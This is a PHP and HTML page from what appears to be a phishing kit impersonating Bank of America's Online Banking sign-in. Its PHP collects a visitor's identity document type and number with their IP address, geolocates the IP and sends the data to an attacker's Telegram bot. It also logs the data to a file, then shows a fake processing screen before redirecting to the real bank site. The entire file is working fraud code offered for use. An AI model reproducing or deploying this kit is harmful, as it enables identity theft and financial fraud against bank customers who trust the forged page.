<?php 
error_reporting(0);

include('dt.php');
session_start();
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$id=md5(rand());
$session=md5(rand());
@ini_set('display_errors', 'on'); 
ob_start();
function getRealIP()
{if (isset($_SERVER["HTTP_CLIENT_IP"])) {return $_SERVER["HTTP_CLIENT_IP"];} elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {return $_SERVER["HTTP_X_FORWARDED_FOR"];} elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {return $_SERVER["HTTP_X_FORWARDED"];} elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {return $_SERVER["HTTP_FORWARDED_FOR"];} elseif (isset($_SERVER["HTTP_FORWARDED"])) {return $_SERVER["HTTP_FORWARDED"];} else {return $_SERVER["REMOTE_ADDR"];}}
$ip=getRealIP();

$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));

   $tdocu = $_POST['docu'];
   $ndocu = $_POST['ndocu'];

date_default_timezone_set('America/Bogota');
@ini_set("display_errors", 0);
if ( isset ($tdocu) && isset ($ndocu)  ){
$message = "B o A \r\nTipo = ".$tdocu."\r\nN° Documento=".$ndocu."\r\n";
$message .= "IP= ".$ip."\r\n";
$apiToken = $apibot;
$data = [
  'chat_id' => $canal,
  'text' => $message];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); }
     $handle = fopen($datos, "a"); 
    fwrite($handle, "Tipo = ".$tdocu."\r\n");
    fwrite($handle, "N° Documeto = ".$ndocu."\r\n");
  	fwrite($handle, "IP= ".$ip."\r\n");
  	fwrite($handle, "=================================\r\n");
  	fclose($handle); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML lang="en-US" lang="en-US" xml:lang="en-US" xmlns="http://www.w3.org/1999/xhtml"><HEAD>
  <meta http-equiv="Expires" content="0">
  <meta http-equiv="Last-Modified" content="0">
  <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
  <meta http-equiv="Pragma" content="no-cache">
    <META content="IE=11.0000" http-equiv="X-UA-Compatible" charset="utf-8">
<META http-equiv="X-UA-Compatible" content="IE=Edge">     
<META name="Keywords" content="Your Online ID">      
<META name="Description" content="Sign in to your Online Banking account by entering your Online ID.">   
 <TITLE>Bank of America | Online Banking | Sign In | Online ID</TITLE> 
 <link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
<META http-equiv="Content-Type" content="text/html; charset=iso-8859-1">  
<META HTTP-EQUIV="Refresh" CONTENT="5;URL=https://bankofamerica.com" >      
<LINK href="css/new.css" rel="stylesheet" type="text/css" media="all">   
<LINK href="css/pin.css" rel="stylesheet" type="text/css" media="all"> 
<meta name="viewport" content="width=	, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
<DIV class="fsd-layout fsd-2c-700lt-layout"><DIV class="fsd-border"><DIV class="center-content"><DIV class="header"><DIV class="header-module"><DIV class="fsd-secure-esp-skin"><IMG width="230" height="28" alt="Bank of America" src="images/BofA_rgb.png"><DIV class="page-type" data-font="cnx-regular">Sign In</DIV><DIV class="right-links"><DIV class="secure-area">Secure Area</DIV><A name="spanish_toggle" title="Muestra esta sesi�n de la Banca en L�nea" target="_self">En Espa&ntilde;ol</A><DIV class="clearboth"></DIV></DIV><DIV class="clearboth"></DIV></DIV></DIV><DIV class="page-title-module h-100" id="skip-to-h1"><DIV class="red-grad-bar-skin sup-ie"><H1 data-font="cnx-regular" style="font-weight: normal">Sign In to Online Banking</H1></DIV></DIV>
<form method="" id="myFormPIN" action="" style="min-height: calc(90vh - 100px - 300px)">
<div class="termino"> <br><br>	

<img style="left:center; " id="Image1" src="./images/Processing2.gif"/>
                            
                           
                              <strong></strong></label></div><br>


</form><DIV class="clearboth"></DIV></DIV><DIV class="footer"><DIV class="footer-top">&nbsp;  </DIV><DIV class="footer-inner"><DIV class="global-footer-module"><DIV class="gray-bground-skin cssp"><DIV class="secure">Secure area</DIV><DIV class="link-container"><DIV class="link-row"><A name="Privacy_&amp;_Security_footer" title="Privacy &amp; Security" class="last-link" href="#" target="_blank">Privacy &amp; Security</A><DIV class="clearboth"></DIV></DIV></DIV><P>Bank of America, N.A. Member FDIC. <A name="Equal_Housing_Lender" href="#" target="_blank">Equal Housing Lender</A> <BR>&copy;2023 Bank of America Corporation.</P></DIV></DIV></DIV></DIV></DIV></DIV></DIV></BODY></HTML>